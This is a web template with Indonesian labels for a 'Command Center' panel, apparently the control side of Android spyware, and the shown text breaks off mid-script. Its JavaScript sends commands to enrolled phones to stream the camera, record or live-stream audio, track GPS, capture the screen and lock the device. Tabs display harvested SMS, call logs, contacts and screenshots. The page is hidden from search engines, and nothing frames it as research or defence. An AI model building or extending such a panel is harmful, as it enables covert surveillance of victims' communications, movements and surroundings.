<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Command Center</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <style>
        :root {
            --bg: #0A0E17; --surface: #111827; --surface-hover: #1a2235;
            --border: #1E293B; --text: #E2E8F0; --text-dim: #64748B; --text-muted: #475569;
            --green: #00FF41; --green-dim: rgba(0,255,65,0.15);
            --cyan: #00D4FF; --cyan-dim: rgba(0,212,255,0.15);
            --red: #FF5252; --red-dim: rgba(255,82,82,0.15);
            --yellow: #FFD600; --yellow-dim: rgba(255,214,0,0.15);
            --purple: #BA68C8; --orange: #FF9800;
            --font: 'JetBrains Mono', 'Fira Code', monospace;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:var(--bg); color:var(--text); font-family:var(--font); font-size:13px; line-height:1.5; min-height:100vh; }

        .cc-wrap { display:flex; height:100vh; overflow:hidden; }
        .cc-side { width:240px; min-width:240px; background:var(--surface); border-right:1px solid var(--border); display:flex; flex-direction:column; overflow:hidden; }
        .cc-main { flex:1; display:flex; flex-direction:column; overflow:hidden; }

        /* Header */
        .cc-hdr { background:var(--surface); border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; justify-content:space-between; flex-shrink:0; }
        .cc-logo { display:flex; align-items:center; gap:8px; }
        .cc-logo-icon { width:30px; height:30px; background:var(--green-dim); border:1px solid var(--green); border-radius:6px; display:flex; align-items:center; justify-content:center; font-size:14px; }
        .cc-logo-sub { font-size:8px; color:var(--green); opacity:.6; letter-spacing:1px; }
        .cc-logo-title { font-size:15px; font-weight:800; color:var(--green); letter-spacing:2px; }
        .cc-hdr-right { display:flex; align-items:center; gap:10px; }
        .cc-clock { font-size:18px; font-weight:700; color:var(--cyan); letter-spacing:2px; }
        .cc-online { display:flex; align-items:center; gap:4px; padding:3px 7px; border-radius:4px; font-size:9px; font-weight:600; background:var(--green-dim); color:var(--green); border:1px solid rgba(0,255,65,.3); }
        .cc-dot-pulse { width:6px; height:6px; border-radius:50%; background:var(--green); animation:pulse 1.5s ease-in-out infinite; }
        @keyframes pulse { 0%,100%{opacity:.4} 50%{opacity:1} }

        /* Sidebar */
        .cc-side-hdr { padding:10px; border-bottom:1px solid var(--border); }
        .cc-side-title { font-size:8px; font-weight:700; color:var(--text-dim); letter-spacing:2px; margin-bottom:6px; }
        .cc-stats { display:flex; gap:3px; }
        .cc-chip { flex:1; display:flex; align-items:center; justify-content:center; gap:3px; padding:3px; border-radius:3px; font-size:9px; font-weight:600; }
        .cc-chip.live { background:var(--green-dim); color:var(--green); }
        .cc-chip.on { background:var(--yellow-dim); color:var(--yellow); }
        .cc-chip.off { background:var(--red-dim); color:var(--red); }
        .cc-devlist { flex:1; overflow-y:auto; padding:4px; }
        .cc-dev { display:flex; align-items:center; gap:5px; padding:6px 7px; border-radius:4px; cursor:pointer; transition:all .12s; margin-bottom:1px; font-size:11px; }
        .cc-dev:hover { background:var(--surface-hover); }
        .cc-dev.sel { background:var(--green-dim); border:1px solid rgba(0,255,65,.3); }
        .cc-dev-dot { width:6px; height:6px; border-radius:50%; flex-shrink:0; }
        .cc-dev-dot.live { background:var(--green); animation:pulse 1.5s ease-in-out infinite; }
        .cc-dev-dot.online { background:var(--yellow); }
        .cc-dev-dot.offline { background:var(--red); opacity:.5; }
        .cc-dev-name { flex:1; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
        .cc-dev-time { font-size:8px; color:var(--text-dim); }

        /* Sidebar Actions */
        .cc-side-act { border-top:1px solid var(--border); padding:8px; overflow-y:auto; max-height:50vh; }
        .cc-act-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:3px; }
        .cc-act { display:flex; align-items:center; justify-content:center; padding:5px 2px; border:1px solid var(--border); border-radius:4px; background:var(--surface); color:var(--text); font-family:var(--font); font-size:8px; font-weight:600; cursor:pointer; transition:all .12s; white-space:nowrap; }
        .cc-act:hover { border-color:var(--green); color:var(--green); background:var(--green-dim); }
        .cc-act.d:hover { border-color:var(--red); color:var(--red); background:var(--red-dim); }
        .cc-act.i:hover { border-color:var(--cyan); color:var(--cyan); background:var(--cyan-dim); }
        .cc-act-lbl { font-size:7px; color:var(--text-dim); letter-spacing:1px; font-weight:700; margin:5px 0 2px; }

        /* Camera Grid */
        .cc-grid { padding:8px; overflow-y:auto; flex-shrink:0; max-height:40vh; }
        .cc-cam-grid { display:grid; grid-template-columns:repeat(2,1fr); gap:6px; }
        .cc-cam { background:var(--surface); border:1px solid var(--border); border-radius:5px; overflow:hidden; position:relative; cursor:pointer; transition:all .12s; }
        .cc-cam:hover { border-color:var(--green); }
        .cc-cam.sel { border-color:var(--green); box-shadow:0 0 10px rgba(0,255,65,.1); }
        .cc-cam-img { width:100%; aspect-ratio:16/9; object-fit:cover; background:#000; display:block; }
        .cc-cam-ph { width:100%; aspect-ratio:16/9; background:linear-gradient(135deg,#0f1623,#1a1f2e); display:flex; flex-direction:column; align-items:center; justify-content:center; color:var(--text-dim); font-size:9px; gap:2px; }
        .cc-cam-bar { padding:4px 6px; display:flex; align-items:center; justify-content:space-between; border-top:1px solid var(--border); }
        .cc-cam-name { font-size:9px; font-weight:600; }
        .cc-cam-st { font-size:7px; padding:1px 4px; border-radius:2px; font-weight:600; }
        .cc-cam-st.live { background:var(--green-dim); color:var(--green); }
        .cc-cam-st.online { background:var(--yellow-dim); color:var(--yellow); }
        .cc-cam-st.offline { background:var(--red-dim); color:var(--red); }
        .cc-cam-badge { position:absolute; top:4px; left:4px; display:flex; align-items:center; gap:3px; padding:1px 5px; border-radius:2px; font-size:7px; font-weight:700; background:rgba(0,0,0,.7); color:var(--red); }
        .cc-cam-badge .rd { width:4px; height:4px; border-radius:50%; background:var(--red); animation:pulse 1s ease-in-out infinite; }

        /* Tabs */
        .cc-tabs-area { border-top:1px solid var(--border); flex:1; display:flex; flex-direction:column; overflow:hidden; }
        .cc-tabs { display:flex; overflow-x:auto; gap:1px; padding:0 8px; background:var(--surface); border-bottom:1px solid var(--border); flex-shrink:0; }
        .cc-tab { padding:7px 9px; font-family:var(--font); font-size:9px; font-weight:600; color:var(--text-dim); background:none; border:none; cursor:pointer; white-space:nowrap; border-bottom:2px solid transparent; transition:all .12s; }
        .cc-tab:hover { color:var(--text); }
        .cc-tab.act { color:var(--green); border-bottom-color:var(--green); }
        .cc-panel { display:none; overflow-y:auto; padding:10px; flex:1; }
        .cc-panel.act { display:block; }

        /* Data elements */
        .cc-tbl { width:100%; border-collapse:collapse; }
        .cc-tbl th { font-size:8px; color:var(--text-dim); letter-spacing:1px; text-align:left; padding:5px 6px; border-bottom:1px solid var(--border); }
        .cc-tbl td { font-size:10px; padding:5px 6px; border-bottom:1px solid var(--border); vertical-align:top; }
        .cc-tbl tr:hover { background:var(--surface-hover); }
        .cc-card { background:var(--surface); border:1px solid var(--border); border-radius:5px; padding:8px; margin-bottom:6px; }
        .cc-empty { text-align:center; padding:24px 12px; color:var(--text-dim); }
        .cc-empty-icon { font-size:28px; opacity:.3; margin-bottom:6px; }
        .cc-badge { display:inline-block; padding:1px 5px; border-radius:2px; font-size:8px; font-weight:600; }
        .cc-badge.g { background:var(--green-dim); color:var(--green); }
        .cc-badge.r { background:var(--red-dim); color:var(--red); }
        .cc-badge.c { background:var(--cyan-dim); color:var(--cyan); }
        .cc-badge.y { background:var(--yellow-dim); color:var(--yellow); }
        .cc-maps { color:var(--cyan); text-decoration:none; font-size:9px; font-weight:600; }
        .cc-maps:hover { text-decoration:underline; }

        /* Stream viewer */
        .cc-stream-box { background:#000; border:1px solid var(--border); border-radius:6px; overflow:hidden; position:relative; margin-bottom:8px; }
        .cc-stream-img { width:100%; display:block; min-height:200px; object-fit:contain; background:#000; }
        .cc-stream-overlay { position:absolute; top:0; left:0; right:0; bottom:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,.8); }
        .cc-stream-ctrl { display:flex; gap:4px; flex-wrap:wrap; margin-bottom:8px; }
        .cc-stream-btn { padding:6px 10px; border:1px solid var(--border); border-radius:4px; background:var(--surface); color:var(--text); font-family:var(--font); font-size:10px; font-weight:600; cursor:pointer; transition:all .12s; }
        .cc-stream-btn:hover { border-color:var(--green); color:var(--green); }
        .cc-stream-btn.active { border-color:var(--green); background:var(--green-dim); color:var(--green); }
        .cc-stream-btn.stop { color:var(--red); }
        .cc-stream-btn.stop:hover { border-color:var(--red); background:var(--red-dim); }
        .cc-stream-status { position:absolute; top:6px; left:6px; display:flex; align-items:center; gap:4px; padding:2px 8px; border-radius:3px; font-size:9px; font-weight:700; background:rgba(0,0,0,.7); }
        .cc-stream-status.live { color:var(--red); }
        .cc-stream-status.wait { color:var(--yellow); }
        .cc-stream-fs { position:absolute; top:6px; right:6px; background:rgba(0,0,0,.7); color:var(--text); border:none; border-radius:3px; padding:3px 6px; cursor:pointer; font-size:12px; }

        /* Status indicators */
        .cc-status-ind { display:flex; align-items:center; gap:6px; padding:6px 10px; border-radius:4px; margin-bottom:8px; font-size:11px; font-weight:600; }
        .cc-status-ind.recording { background:var(--red-dim); color:var(--red); border:1px solid rgba(255,82,82,.3); }
        .cc-status-ind.tracking { background:var(--cyan-dim); color:var(--cyan); border:1px solid rgba(0,212,255,.3); }
        .cc-status-ind.waiting { background:var(--yellow-dim); color:var(--yellow); border:1px solid rgba(255,214,0,.3); }
        .cc-pulse-dot { width:8px; height:8px; border-radius:50%; animation:pulse 1s ease-in-out infinite; }

        /* Audio player */
        .cc-audio { display:flex; align-items:center; gap:6px; padding:6px; background:var(--surface); border:1px solid var(--border); border-radius:4px; margin-bottom:4px; }
        .cc-audio audio { flex:1; height:26px; }

        /* Info grid */
        .cc-info-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(130px,1fr)); gap:6px; }
        .cc-info-item label { font-size:8px; color:var(--text-dim); letter-spacing:1px; font-weight:600; display:block; }
        .cc-info-item span { font-size:11px; font-weight:500; }

        /* Fullscreen */
        .cc-fs { position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,.95); z-index:1000; display:none; align-items:center; justify-content:center; cursor:pointer; }
        .cc-fs.on { display:flex; }
        .cc-fs img { max-width:95vw; max-height:95vh; object-fit:contain; }
        .cc-fs-close { position:fixed; top:10px; right:10px; font-size:22px; color:var(--text); cursor:pointer; background:rgba(0,0,0,.5); width:32px; height:32px; display:flex; align-items:center; justify-content:center; border-radius:50%; z-index:1001; }
        .cc-fs-name { position:fixed; bottom:14px; left:50%; transform:translateX(-50%); color:var(--green); font-size:12px; font-weight:700; background:rgba(0,0,0,.7); padding:3px 10px; border-radius:4px; z-index:1001; }

        /* Toast & Log */
        .cc-toast { position:fixed; bottom:14px; right:14px; background:var(--surface); border:1px solid var(--green); color:var(--green); padding:6px 12px; border-radius:4px; font-size:10px; font-family:var(--font); z-index:2000; opacity:0; transform:translateY(6px); transition:all .3s; }
        .cc-toast.show { opacity:1; transform:translateY(0); }
        .cc-toast.err { border-color:var(--red); color:var(--red); }
        .cc-log { border-top:1px solid var(--border); padding:4px 10px; max-height:60px; overflow-y:auto; flex-shrink:0; background:var(--bg); font-size:9px; }
        .cc-log-item { display:flex; gap:6px; padding:1px 0; color:var(--text-dim); }
        .cc-log-time { color:var(--cyan); min-width:36px; }

        /* Mobile */
        .cc-mob-btn { display:none; background:none; border:1px solid var(--border); border-radius:4px; color:var(--text); padding:3px 6px; cursor:pointer; font-size:14px; }
        .cc-side-ov { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,.5); z-index:499; }
        .cc-side-ov.on { display:block; }
        @media(max-width:768px) {
            .cc-mob-btn { display:flex; }
            .cc-side { position:fixed; left:-260px; top:0; height:100vh; z-index:500; transition:left .3s; }
            .cc-side.on { left:0; box-shadow:4px 0 20px rgba(0,0,0,.5); }
            .cc-cam-grid { grid-template-columns:1fr; }
            .cc-grid { max-height:30vh; }
            .cc-act-grid { grid-template-columns:1fr 1fr; }
            .cc-info-grid { grid-template-columns:1fr 1fr; }
        }
        ::-webkit-scrollbar { width:3px; height:3px; }
        ::-webkit-scrollbar-track { background:var(--bg); }
        ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
    </style>
</head>
<body>
<div class="cc-fs" id="fs" onclick="closeFs()"><div class="cc-fs-close">✕</div><img id="fsImg" src=""><div class="cc-fs-name" id="fsName"></div></div>
<div class="cc-toast" id="toast"></div>
<div class="cc-side-ov" id="sideOv" onclick="toggleSide()"></div>

<div class="cc-wrap">
<!-- SIDEBAR -->
<aside class="cc-side" id="side">
    <div class="cc-side-hdr">
        <div class="cc-side-title">DEVICES</div>
        <div class="cc-stats">
            <div class="cc-chip live"><span id="cLive">0</span> LIVE</div>
            <div class="cc-chip on"><span id="cOn">0</span> ON</div>
            <div class="cc-chip off"><span id="cOff">0</span> OFF</div>
        </div>
    </div>
    <div class="cc-devlist" id="devList"><div class="cc-empty" style="padding:30px"><div style="font-size:18px;opacity:.3">📡</div><div style="font-size:9px">Loading...</div></div></div>
    <div class="cc-side-act" id="sideAct" style="display:none">
        <div class="cc-side-title">ACTIONS — <span id="actName" style="color:var(--green)"></span></div>
        <div class="cc-act-lbl">📹 KAMERA</div>
        <div class="cc-act-grid" style="margin-bottom:4px">
            <button class="cc-act" onclick="cmd('START','BACK')">▶ START</button>
            <button class="cc-act d" onclick="cmd('STOP')">⏹ STOP</button>
            <button class="cc-act i" onclick="cmd('SWITCH')">🔄 FLIP</button>
        </div>
        <div class="cc-act-lbl">🎙 AUDIO</div>
        <div class="cc-act-grid" style="margin-bottom:4px">
            <button class="cc-act" onclick="cmd('AUDIO_RECORD')">🎙 REC</button>
            <button class="cc-act" onclick="cmd('AUDIO_LIVE_START')">🔴 LIVE</button>
            <button class="cc-act d" onclick="cmd('AUDIO_STOP')">⏹ STOP</button>
        </div>
        <div class="cc-act-lbl">📍 LOKASI</div>
        <div class="cc-act-grid" style="margin-bottom:4px">
            <button class="cc-act" onclick="cmd('LOCATION_GET')">📍 GET</button>
            <button class="cc-act" onclick="cmd('LOCATION_START')">📍 TRACK</button>
            <button class="cc-act d" onclick="cmd('LOCATION_STOP')">⏹ STOP</button>
        </div>
        <div class="cc-act-lbl">🎮 REMOTE</div>
        <div class="cc-act-grid" style="margin-bottom:4px">
            <button class="cc-act d" onclick="cmd('REMOTE_LOCK')">🔒 LOCK</button>
            <button class="cc-act" onclick="cmd('REMOTE_RING')">🔔 RING</button>
            <button class="cc-act d" onclick="cmd('REMOTE_STOP_RING')">⏹ RING</button>
            <button class="cc-act" onclick="cmd('REMOTE_FLASH_ON')" style="color:var(--yellow)">🔦 ON</button>
            <button class="cc-act" onclick="cmd('REMOTE_FLASH_OFF')">🌑 OFF</button>
            <button class="cc-act i" onclick="cmd('REMOTE_FLASH_BLINK')">💡 BLINK</button>
            <button class="cc-act d" onclick="cmd('REMOTE_FLASH_SOS')">🆘 SOS</button>
            <button class="cc-act" onclick="cmd('REMOTE_FLASH_PULSE')" style="color:var(--purple)">💫 PULSE</button>
            <button class="cc-act" onclick="cmd('REMOTE_CAPTURE_NOW')">📸 SNAP</button>
        </div>
        <div class="cc-act-lbl">🖥️ LAYAR</div>
        <div class="cc-act-grid">
            <button class="cc-act" onclick="cmd('SCREEN_START')">▶ START</button>
            <button class="cc-act d" onclick="cmd('SCREEN_STOP')">⏹ STOP</button>
            <button class="cc-act i" onclick="cmd('REMOTE_DEVICE_INFO')">📊 INFO</button>
        </div>
    </div>
</aside>

<!-- MAIN -->
<div class="cc-main">
    <header class="cc-hdr">
        <div class="cc-logo">
            <button class="cc-mob-btn" onclick="toggleSide()">☰</button>
            <div class="cc-logo-icon">⚡</div>
            <div><div class="cc-logo-sub">root@cc:~#</div><div class="cc-logo-title">COMMAND CENTER</div></div>
        </div>
        <div class="cc-hdr-right">
            <div class="cc-online"><div class="cc-dot-pulse"></div>ONLINE</div>
            <div class="cc-clock" id="clock">--:--:--</div>
        </div>
    </header>

    <!-- Camera Grid -->
    <div class="cc-grid"><div class="cc-cam-grid" id="camGrid"><div class="cc-empty"><div class="cc-empty-icon">📡</div><div>Menunggu device...</div></div></div></div>

    <!-- Tabs -->
    <div class="cc-tabs-area" id="tabsArea" style="display:none">
        <div class="cc-tabs">
            <button class="cc-tab act" onclick="goTab('stream')">📹 Stream</button>
            <button class="cc-tab" onclick="goTab('info')">📊 Info</button>
            <button class="cc-tab" onclick="goTab('location')">📍 Lokasi</button>
            <button class="cc-tab" onclick="goTab('audio')">🎙 Audio</button>
            <button class="cc-tab" onclick="goTab('activity')">📋 Log</button>
            <button class="cc-tab" onclick="goTab('sms')">📩 SMS</button>
            <button class="cc-tab" onclick="goTab('calls')">📞 Calls</button>
            <button class="cc-tab" onclick="goTab('contacts')">👤 Kontak</button>
            <button class="cc-tab" onclick="goTab('screenshots')">📸 Capture</button>
        </div>

        <!-- STREAM PANEL -->
        <div class="cc-panel act" id="p-stream">
            <div class="cc-stream-ctrl">
                <button class="cc-stream-btn active" onclick="cmd('START','BACK')">▶ Start Kamera</button>
                <button class="cc-stream-btn stop" onclick="cmd('STOP')">⏹ Stop</button>
                <button class="cc-stream-btn" onclick="cmd('SWITCH')">🔄 Switch Lens</button>
                <button class="cc-stream-btn" onclick="cmd('TAKE_PHOTO','BACK')">📸 Foto Back</button>
                <button class="cc-stream-btn" onclick="cmd('TAKE_PHOTO','FRONT')">📸 Foto Front</button>
                <button class="cc-stream-btn" onclick="cmd('SCREEN_START')">🖥️ Screen Capture</button>
            </div>
            <div id="streamStatus"></div>
            <div class="cc-stream-box" id="streamBox">
                <div class="cc-stream-overlay" id="streamWait">
                    <div style="text-align:center;color:var(--text-dim)">
                        <div style="font-size:36px;opacity:.4;margin-bottom:8px">📹</div>
                        <div style="font-size:12px">Tekan "▶ Start Kamera" untuk mulai streaming</div>
                        <div style="font-size:10px;color:var(--text-muted);margin-top:4px">Frame akan muncul otomatis saat device mengirim data</div>
                    </div>
                </div>
                <img class="cc-stream-img" id="streamImg" src="" alt="" style="display:none"
                     onload="document.getElementById('streamWait').style.display='none';this.style.display='block'"
                     onerror="this.style.display='none';document.getElementById('streamWait').style.display='flex'">
                <div class="cc-stream-status live" id="streamLive" style="display:none"><div class="cc-pulse-dot" style="background:var(--red)"></div> LIVE</div>
                <button class="cc-stream-fs" id="streamFsBtn" onclick="openFs(selectedDevice?.device_name, document.getElementById('streamImg').src)" style="display:none">⛶</button>
            </div>
            <div style="display:flex;gap:6px;margin-top:4px">
                <button class="cc-stream-btn" onclick="startMjpeg()" id="btnMjpeg">👁 MJPEG Stream (Smooth)</button>
                <button class="cc-stream-btn" onclick="startPolling()" id="btnPoll">🔄 Snapshot Polling</button>
                <button class="cc-stream-btn" onclick="viewScreen()">🖥️ View Screen</button>
            </div>
        </div>

        <!-- INFO PANEL -->
        <div class="cc-panel" id="p-info"><div class="cc-info-grid" id="infoGrid"><div class="cc-empty"><div class="cc-empty-icon">📊</div><div>Pilih device</div></div></div></div>

        <!-- LOCATION PANEL -->
        <div class="cc-panel" id="p-location">
            <div class="cc-stream-ctrl">
                <button class="cc-stream-btn active" onclick="cmd('LOCATION_GET')">📍 Lacak Sekali</button>
                <button class="cc-stream-btn" onclick="cmd('LOCATION_START')">📍 Mulai Tracking</button>
                <button class="cc-stream-btn stop" onclick="cmd('LOCATION_STOP')">⏹ Stop Tracking</button>
            </div>
            <div id="locStatus"></div>
            <div id="locList"><div class="cc-empty"><div class="cc-empty-icon">📍</div><div>Belum ada data lokasi</div><div style="font-size:9px;color:var(--text-muted)">Tekan "📍 Lacak Sekali" untuk mendapat lokasi</div></div></div>
        </div>

        <!-- AUDIO PANEL -->
        <div class="cc-panel" id="p-audio">
            <div class="cc-stream-ctrl">
                <button class="cc-stream-btn active" onclick="cmd('AUDIO_RECORD')">🎙 Rekam 2 Menit</button>
                <button class="cc-stream-btn" onclick="cmd('AUDIO_LIVE_START')">🔴 Live Audio</button>
                <button class="cc-stream-btn stop" onclick="cmd('AUDIO_STOP')">⏹ Stop</button>
            </div>
            <div id="audStatus"></div>
            <div id="audList"><div class="cc-empty"><div class="cc-empty-icon">🎙</div><div>Belum ada rekaman</div><div style="font-size:9px;color:var(--text-muted)">Tekan "🎙 Rekam" lalu tunggu ~2 menit</div></div></div>
        </div>

        <!-- ACTIVITY PANEL -->
        <div class="cc-panel" id="p-activity"><div id="actList"><div class="cc-empty"><div class="cc-empty-icon">📋</div><div>Belum ada log</div></div></div></div>

        <!-- SMS PANEL -->
        <div class="cc-panel" id="p-sms"><div id="smsList"><div class="cc-empty"><div class="cc-empty-icon">📩</div><div>Belum ada SMS</div></div></div></div>

        <!-- CALLS PANEL -->
        <div class="cc-panel" id="p-calls"><div id="callsList"><div class="cc-empty"><div class="cc-empty-icon">📞</div><div>Belum ada panggilan</div></div></div></div>

        <!-- CONTACTS PANEL -->
        <div class="cc-panel" id="p-contacts"><div id="conList"><div class="cc-empty"><div class="cc-empty-icon">👤</div><div>Belum ada kontak</div></div></div></div>

        <!-- SCREENSHOTS PANEL -->
        <div class="cc-panel" id="p-screenshots"><div id="snapList" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:4px"><div class="cc-empty" style="grid-column:1/-1"><div class="cc-empty-icon">📸</div><div>Belum ada screenshot</div></div></div></div>
    </div>

    <div class="cc-log" id="logBar"><div class="cc-log-item"><span class="cc-log-time">--:--</span><span>Init...</span></div></div>
</div>
</div>

<script>
const T=@json($token), B=`/cc/${T}`, CS=document.querySelector('meta[name="csrf-token"]')?.content;
let devs=[],sel=null,logs=[],curTab='stream',pollIv=null,streamMode='none';

// Clock
setInterval(()=>{const n=new Date();document.getElementById('clock').textContent=[n.getHours(),n.getMinutes(),n.getSeconds()].map(v=>String(v).padStart(2,'0')).join(':')},1000);

// Fetch devices
async function fetchDevs(){
    try{const r=await fetch(`${B}/api/devices`);const j=await r.json();devs=j.data||[];renderDevs();renderCams();updateStats();
    if(sel){const u=devs.find(d=>d.device_name===sel.device_name);if(u){sel=u;}}
    }catch(e){addLog('⚠️ '+e.message,1)}
}

function renderDevs(){
    const el=document.getElementById('devList');
    if(!devs.length){el.innerHTML='<div class="cc-empty" style="padding:30px"><div style="font-size:18px;opacity:.3">📡</div><div style="font-size:9px">Tidak ada device</div></div>';return;}
    el.innerHTML=devs.map(d=>`<div class="cc-dev ${sel?.device_name===d.device_name?'sel':''}" onclick="pick('${esc(d.device_name)}')"><div class="cc-dev-dot ${d.status}"></div><div class="cc-dev-name">${d.device_name}</div><div class="cc-dev-time">${tAgo(d.last_heartbeat_at)}</div></div>`).join('');
}

function renderCams(){
    const g=document.getElementById('camGrid');
    if(!devs.length){g.innerHTML='<div class="cc-empty"><div class="cc-empty-icon">📡</div><div>Tidak ada device</div></div>';return;}
    const s=devs.slice(0,6);
    const c=s.length<=1?1:s.length<=4?2:3;
    g.style.gridTemplateColumns=window.innerWidth<768?'1fr':`repeat(${c},1fr)`;
    g.innerHTML=s.map(d=>{
        const live=d.is_streaming||d.status==='live';
        const url=`${B}/api/frame/${encodeURIComponent(d.device_name)}?t=${Date.now()}`;
        return `<div class="cc-cam ${sel?.device_name===d.device_name?'sel':''}" onclick="pick('${esc(d.device_name)}')"> 
            ${live?`<div class="cc-cam-badge"><div class="rd"></div> LIVE</div><img class="cc-cam-img" src="${url}" onload="if(this.naturalWidth<=2){this.style.display='none';this.nextElementSibling.style.display='flex'}else{this.style.display='block';this.nextElementSibling.style.display='none'}" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'" alt=""><div class="cc-cam-ph" style="display:none"><div style="font-size:18px;opacity:.4">📹</div><div>⏳ Menunggu frame...</div><div style='font-size:8px;color:var(--text-muted)'>Device sedang streaming</div></div>`
            :`<div class="cc-cam-ph"><div style="font-size:18px;opacity:.4">${d.status==='online'?'📱':'📴'}</div><div>${d.status==='online'?'Kamera OFF':'Offline'}</div></div>`}
            <div class="cc-cam-bar"><div class="cc-cam-name">${d.device_name}</div><div class="cc-cam-st ${d.status}">${d.status.toUpperCase()}</div></div>
        </div>`;
    }).join('');
}

function pick(name){
    sel=devs.find(d=>d.device_name===name)||null;
    stopStream();
    renderDevs();renderCams();renderInfo();renderAct();
    document.getElementById('tabsArea').style.display=sel?'flex':'none';
    if(sel){
        // Auto-switch to Stream tab and auto-start if device is live
        goTab('stream');
        addLog('🎯 '+name);
    }
    if(window.innerWidth<768)toggleSide(false);
}

// Tab system with auto-switch
function goTab(t){
    curTab=t;
    document.querySelectorAll('.cc-tab').forEach(b=>b.classList.toggle('act',b.textContent.includes(tabLabel(t))));
    document.querySelectorAll('.cc-panel').forEach(p=>p.classList.toggle('act',p.id===`p-${t}`));
    loadTab(t);
}

function tabLabel(t){
    return{stream:'Stream',info:'Info',location:'Lokasi',audio:'Audio',activity:'Log',sms:'SMS',calls:'Calls',contacts:'Kontak',screenshots:'Capture'}[t]||t;
}

function loadTab(t){
    if(!sel)return;
    const f={location:fetchLoc,audio:fetchAud,activity:fetchAct,sms:fetchSms,calls:fetchCalls,contacts:fetchCon,screenshots:fetchSnap,info:renderInfo,stream:initStream};
    if(f[t])f[t]();
}

// AUTO-SWITCH: command → relevant tab
const CMD_TAB={
    START:'stream',STOP:'stream',SWITCH:'stream',TAKE_PHOTO:'stream',
    SCREEN_START:'stream',SCREEN_STOP:'stream',
    LOCATION_GET:'location',LOCATION_START:'location',LOCATION_STOP:'location',
    AUDIO_RECORD:'audio',AUDIO_LIVE_START:'audio',AUDIO_STOP:'audio',
    REMOTE_DEVICE_INFO:'info',REMOTE_APP_LIST:'info',
    REMOTE_CAPTURE_NOW:'screenshots',
};

async function cmd(action,lens){
    if(!sel){toast('Pilih device dulu',1);return;}
    const n=sel.device_name;
    addLog(`📡 ${action} → ${n}...`);
    // Auto-switch to relevant tab
    const tab=CMD_TAB[action];
    if(tab)goTab(tab);
    // Show status indicator
    showCmdStatus(action);
    try{
        const r=await fetch(`${B}/api/command/${encodeURIComponent(n)}`,{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':CS},body:JSON.stringify({action,lens:lens||'BACK'})});
        const j=await r.json();
        if(j.success){toast(`✓ ${action} → ${n}`);addLog(`✅ ${action} sent`);setTimeout(()=>{fetchDevs();if(tab)loadTab(tab);},3000);}
        else{toast(`✗ ${j.message||'Failed'}`,1);addLog(`❌ ${j.message}`,1);}
    }catch(e){toast('⚠️ Network error',1);addLog(`⚠️ ${e.message}`,1);}
}

function showCmdStatus(action){
    if(['START'].includes(action)){
        document.getElementById('streamStatus').innerHTML='<div class="cc-status-ind waiting"><div class="cc-pulse-dot" style="background:var(--yellow)"></div> Mengirim perintah START... Frame akan muncul dalam 3-5 detik</div>';
        setTimeout(()=>{startPolling();},3000);
    }
    if(action==='STOP'){document.getElementById('streamStatus').innerHTML='';stopStream();}
    if(action==='LOCATION_GET'){document.getElementById('locStatus').innerHTML='<div class="cc-status-ind waiting"><div class="cc-pulse-dot" style="background:var(--yellow)"></div> Menunggu data lokasi... (5-10 detik)</div>';setTimeout(fetchLoc,8000);}
    if(action==='LOCATION_START'){document.getElementById('locStatus').innerHTML='<div class="cc-status-ind tracking"><div class="cc-pulse-dot" style="background:var(--cyan)"></div> GPS Tracking aktif — auto-refresh setiap 10 detik</div>';}
    if(action==='LOCATION_STOP'){document.getElementById('locStatus').innerHTML='';}
    if(action==='AUDIO_RECORD'){document.getElementById('audStatus').innerHTML='<div class="cc-status-ind recording"><div class="cc-pulse-dot" style="background:var(--red)"></div> 🎙 Merekam audio... (~2 menit). Akan muncul di daftar setelah selesai.</div>';setTimeout(fetchAud,130000);}
    if(action==='AUDIO_LIVE_START'){document.getElementById('audStatus').innerHTML='<div class="cc-status-ind recording"><div class="cc-pulse-dot" style="background:var(--red)"></div> 🔴 Live Audio aktif — chunks akan muncul di daftar</div>';}
    if(action==='AUDIO_STOP'){document.getElementById('audStatus').innerHTML='';setTimeout(fetchAud,2000);}
    if(action==='SCREEN_START'){
        document.getElementById('streamStatus').innerHTML='<div class="cc-status-ind tracking"><div class="cc-pulse-dot" style="background:var(--cyan)"></div> 🖥️ Screen capture aktif — klik "View Screen" untuk melihat</div>';
    }
}

// Stream viewer — auto-start if device is already live
function initStream(){
    if(!sel)return;
    const d=sel;
    if(d.is_streaming||d.status==='live'){
        // Device already streaming, auto-start polling
        document.getElementById('streamStatus').innerHTML='<div class="cc-status-ind tracking"><div class="cc-pulse-dot" style="background:var(--cyan)"></div> Device LIVE — auto-polling started</div>';
        startPolling();
    } else if(d.status==='online'){
        document.getElementById('streamStatus').innerHTML='<div class="cc-status-ind waiting"><div class="cc-pulse-dot" style="background:var(--yellow)"></div> Device online. Tekan "▶ Start Kamera" untuk mulai streaming.</div>';
    }
}

function startPolling(){
    if(!sel)return;
    stopStream();streamMode='poll';
    const img=document.getElementById('streamImg');
    const name=sel.device_name;
    let hasFrame=false;
    const refresh=()=>{
        if(streamMode!=='poll')return;
        const tmpImg=new Image();
        tmpImg.onload=function(){
            if(this.naturalWidth>2){
                img.src=this.src;
                img.style.display='block';
                document.getElementById('streamWait').style.display='none';
                if(!hasFrame){hasFrame=true;document.getElementById('streamStatus').innerHTML='<div class="cc-status-ind tracking"><div class="cc-pulse-dot" style="background:var(--cyan)"></div> 🔄 Streaming aktif (polling 2s)</div>';}
            } else {
                // 1x1 pixel fallback — frame belum ada
                img.style.display='none';
                document.getElementById('streamWait').style.display='flex';
